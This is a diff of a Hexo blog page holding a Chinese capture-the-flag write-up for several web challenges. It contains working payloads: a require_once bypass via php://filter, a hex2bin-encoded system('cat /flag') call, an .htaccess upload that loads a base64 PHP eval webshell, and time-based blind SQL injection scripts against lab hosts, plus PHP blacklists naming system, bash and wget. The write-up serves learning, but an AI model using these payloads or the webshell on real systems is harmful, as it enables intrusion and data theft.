@@ -81,7 +81,8 @@
     
   </style>
   
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
 
 
 
@@ -180,7 +181,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~8.78K
+                        ~8.68K
                     
                     字
                 </li>
@@ -208,142 +209,117 @@
 <p>只有自己不会做的世界达成了</p>
 <p>Misc的话… 之后再看看</p>
 <span id="more"></span>
-
-<h2><span id="phpdest">phpdest</span></h2><p>require_once绕过</p>
+<h2><span id="phpdest"> phpdest</span></h2>
+<p>require_once绕过</p>
 <hr>
 <p>require_once()：引用或者包含外部的一个php文件，但是如果已经包含过一次了，该文件不会再次被包含</p>
 <p>源码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>可以看见flag.php已经被包含了一次了，所以我们要进行require_once的绕过</p>
 <p>参考这篇文章的payload：</p>
 <p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/83909.html">php源码分析 require_once 绕过不能重复包含文件的限制 | CN-SEC 中文网</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span></span><br></pre></td></tr></table></figure>
-
 <p>进行base64解码后就能获得flag</p>
-
 
 <p>成功获得flag</p>
 
-
-
-
-<h2><span id="easyphp">EasyPHP</span></h2><p>提示：Post something</p>
+<h2><span id="easyphp"> EasyPHP</span></h2>
+<p>提示：Post something</p>
 <p>认识set_error_handler()</p>
 <hr>
 <p>源码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br><span class="line"><span class="meta">?&gt;</span> Try harder!</span><br></pre></td></tr></table></figure>
-
 <p>上面那个if的条件肯定是实现不了的，哪里有大于24小时或者31天或者60秒的时候啊</p>
 <p>所以关键就是在set_error_handler()上了</p>
 <p>这个函数是，当报错时，就会执行</p>
 <p>也就是我们要POST传参让其报错（</p>
 <p>又因为$fl4g 和 $dest0g3之间有个. 代表拼接</p>
-<p>（例如fl4g&#x3D;a dest0g3&#x3D;b 之后的结果就是ab）</p>
+<p>（例如fl4g=a dest0g3=b 之后的结果就是ab）</p>
 <p>但是php中，数组和字符串是不能拼接的，会报错</p>
 <p>所以我们传入数组</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-
 <p>就会报错，执行set_error_hanlder 打印fl4g</p>
 
-
-<h2><span id="simplerce">SimpleRCE</span></h2><p>学到了新姿势…</p>
+<h2><span id="simplerce"> SimpleRCE</span></h2>
+<p>学到了新姿势…</p>
 <p>Try Try hex2bin</p>
 <hr>
 <p>源码如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>我的妈，那叫一个地狱绘图</p>
-<p>ban掉了:  ^ 、.、&#96;、大于号、小于号、等于号、双引号、正则preg、&amp;、|、%0、{}、$、+、\</p>
+<p>ban掉了:  ^ 、.、`、大于号、小于号、等于号、双引号、正则preg、&amp;、|、%0、{}、$、+、\</p>
 <p>然后ban掉了常用的eval执行的命令</p>
 <p>但是，唯独少了个单引号</p>
 <p>参考了dalao的wp，发现一个神奇的函数：hex2bin()</p>
 <hr>
 <p>hex2bin()：转换十六进制字符为二进制ASCII字符串</p>
 <p>用法：hex2bin(‘hexcode’)</p>
-<p>例：<code>echo hex2bin(&#39;68656c6c6f20776f726c64&#39;);</code>  &#x2F;&#x2F;输出Hello World</p>
+<p>例：<code>echo hex2bin('68656c6c6f20776f726c64');</code>  //输出Hello World</p>
 <p>所以没有过滤单引号给我们使用了hex2bin的机会</p>
-<p>只需要构造出system(‘cat &#x2F;flag’)就结束了</p>
-<p><font size="5" color="violet">system –&gt; 73797374656d</font></p>
-<p><font size="5" color="violet">cat &#x2F;flag –&gt; 636174202f666c6167</font></p>
+<p>只需要构造出system(‘cat /flag’)就结束了</p>
+<p><font size="5" color="violet">system --&gt; 73797374656d</font></p>
+<p><font size="5" color="violet">cat /flag --&gt; 636174202f666c6167</font></p>
 <p>也就是构造</p>
-<p><code>aaa=hex2bin(&#39;73797374656d&#39;)(hex2bin(&#39;636174202f666c6167&#39;));</code></p>
+<p><code>aaa=hex2bin('73797374656d')(hex2bin('636174202f666c6167'));</code></p>
 <p>成功获取flag</p>
 
-
 <hr>
-<h2><span id="funny_upload">funny_upload</span></h2><p>.htaccess的新姿势</p>
+<h2><span id="funny_upload"> funny_upload</span></h2>
+<p>.htaccess的新姿势</p>
 <p>文件上传的新姿势</p>
 <hr>
 <p>打开F12可以看到如下脚本：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Checkfiles</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> fup = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fileName = fup.<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> ext = fileName.<span class="title function_">substring</span>(fileName.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ext == <span class="string">&quot;gif&quot;</span> || ext == <span class="string">&quot;GIF&quot;</span> || ext == <span class="string">&quot;JPEG&quot;</span> || ext == <span class="string">&quot;jpeg&quot;</span> || ext == <span class="string">&quot;jpg&quot;</span> || ext == <span class="string">&quot;JPG&quot;</span> || ext == <span class="string">&quot;png&quot;</span> || ext == <span class="string">&quot;PNG&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;这个文件不好，我不喜欢&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>对后缀做了要求，我第一次做的时候直接传.htaccess和图片🐎蚁剑是连不上的&#x3D; &#x3D;</p>
+<p>对后缀做了要求，我第一次做的时候直接传.htaccess和图片🐎蚁剑是连不上的= =</p>
 <p>看看wp，要用php包含的方式连蚁剑，我也不知道为什么，挺神奇的</p>
 <p>我们的.htaccess参数有：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script .jpg  <span class="comment">//采用php5-script处理器来解析匹配到的文件</span></span><br><span class="line">SetHandler application/x-httpd-php  <span class="comment">//将该目录和子目录所有文件映射为php类型（也就是当作PHP文件解析）</span></span><br><span class="line">AddType application/x-httpd-php .jpg <span class="comment">//将特定后缀文件映射为php类型</span></span><br></pre></td></tr></table></figure>
-
 <p>.htaccess中使用auto_prepend_file与auto_append_file能在所有页面的顶部和底部require文件</p>
 <p>php_value auto_prepend_file 在页面顶部加载文件</p>
 <p>php_value auto_append_file 在页面底部加载文件</p>
 <p>所以我们传入的.htaccess文件内容如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt  <span class="comment">//将.txt文件解析为php</span></span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=1.txt&quot;</span></span><br><span class="line"><span class="comment">//直接加载php://filter/convert.base64-decode/resource=1.txt（很熟悉吧，如果成功上传，就会在文件的底部加上1.txt base64解码的东西）</span></span><br></pre></td></tr></table></figure>
 
-
-
-
-
 <p>然后传个1.txt</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;  --&gt;base64 encode</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+</span><br></pre></td></tr></table></figure>
-
-
 
 <p>蚁剑连接，找到flag</p>
 
 
-
-
 <hr>
-<h2><span id="really-easy-sql">Really Easy SQL</span></h2><p>延时盲注（过滤sleep()，substr()）</p>
+<h2><span id="really-easy-sql"> Really Easy SQL</span></h2>
+<p>延时盲注（过滤sleep()，substr()）</p>
 <hr>
 <p>输入啥都没反应，由于又是SQL注入，很容易想到延时盲注</p>
 <p>提示是insert注入</p>
-<p>所以payload的格式有：<code>0&#39; or payload or&#39; </code></p>
+<p>所以payload的格式有：<code>0' or payload or' </code></p>
 <p>采用NewStarCTF的延时盲注脚本就可以了</p>
 <p>但是这里直接使用会发现啥也没有，那肯定是过滤了字段</p>
 <p>找了找writeup：</p>
 <p>发现给了黑名单</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;updatexml&#x27;</span>,<span class="string">&#x27;order&#x27;</span>,<span class="string">&#x27;by&#x27;</span>,<span class="string">&#x27;substr&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;extractvalue&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;alter&#x27;</span>,<span class="string">&#x27;handler&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;like&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;offset&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;case&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;load&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
 <p>过滤sleep和substr</p>
 <p>所以我们的payload修改下，mid能够替换substr，benchmark能替换sleep</p>
 <p>benchmark：让数据库反复多次做一件事，增大延迟（比如执行2500000次的MD5加密）</p>
 <span class="blur">这个benchmark的误差真的太大了，注意使用时按照延迟修改下keep>的参数</span>
-
 <span class="blur">尤其是跑table和column的时候，那个误差，会输出全是~</span>
-
 <p>同样使用二分脚本即可，payload编写方式与NewStarCTF 的延时盲注一致</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;http://8339f26b-3e1c-4fac-ab18-04b68c3e6279.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right =<span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.tables)where(table_name=&#x27;flaggg&#x27;)),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="string">&quot;0&#x27;||if(ascii(mid((select(group_concat(cmd))from(flaggg)),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;</span>%(i,mid)</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">#这里使用管道符||替代or，但是黑名单是没有过滤or的，如果使用or的话需要多加一个括号</span></span><br><span class="line"></span><br><span class="line">        times = time.time()</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time()</span><br><span class="line">        keep = timee-times</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">1.8</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>同样的，睡一觉起来就能拿到flag了</p>
 <p>先去睡会吧~</p>
 
-
 <p>不通顺的地方我也没办法，benchmark真的就是误差太大了，我这边使用3000000次和1.8能跑出flag</p>
 
-
-<h2><span id="easysql">EasySQL</span></h2><p>和上一题是一样的，但是过滤了大小于号…</p>
+<h2><span id="easysql"> EasySQL</span></h2>
+<p>和上一题是一样的，但是过滤了大小于号…</p>
 <p>那么我们就不能够用二分跑了，只能一个个遍历，我靠</p>
 <p>用二分能够稍微提速，遍历那就是坐牢中的坐牢了（我手机点完外卖了都没跑完一个）</p>
 <p>同样写脚本，只需要注意什么时候中断循环就行了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://b200590b-0cb2-40ff-9914-1837b3815604.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>,<span class="number">32</span>,-<span class="number">1</span>):</span><br><span class="line">        a = <span class="number">0</span></span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,j)</span></span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flaggg&#x27;)),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,j)</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="string">&quot;0&#x27;||if(ascii(mid((select(group_concat(cmd))from(flaggg)),%d,1))=%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;</span>%(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        times = time.time()</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time()</span><br><span class="line">        keep = timee-times</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">1.8</span>:</span><br><span class="line">            res+=<span class="built_in">chr</span>(j)<span class="comment">#不是二分查询了，所以直接相等就行了</span></span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span> <span class="comment">#结束本次循环，进入下一次循环</span></span><br><span class="line">    <span class="keyword">if</span>(j==<span class="number">33</span>):<span class="comment">#中断循环</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>同样使用3000000次和1.8的keep，跑出来的结果是最精确的</p>
-<p>当然也可以试试(32,127)，正向跑，<del>不知道正向跑和反向跑哪个快点呢&#x3D; &#x3D;</del></p>
+<p>当然也可以试试(32,127)，正向跑，<s>不知道正向跑和反向跑哪个快点呢= =</s></p>
 <span class="blur">这是真的慢啊啊啊啊啊</span>
-
 <p>跑了大概17、8分钟后，终于跑完了</p>
-
 
 <hr>
 <p>会看wp然后会做的就这点了，剩下的啥都不会做，寄寄寄</p>
@@ -555,7 +531,7 @@ Misc的话… 之后再看看`;
     <div class="photo-background"></div>
     <div class="photo-wrapper clearfix">
         <div class="photo-wrapper-tip text-center">
-            <img class="about-photo" src="/images/luo.webp" loading="lazy" decoding="auto" />
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
         </div>
     </div>
     <div class="textwidget">
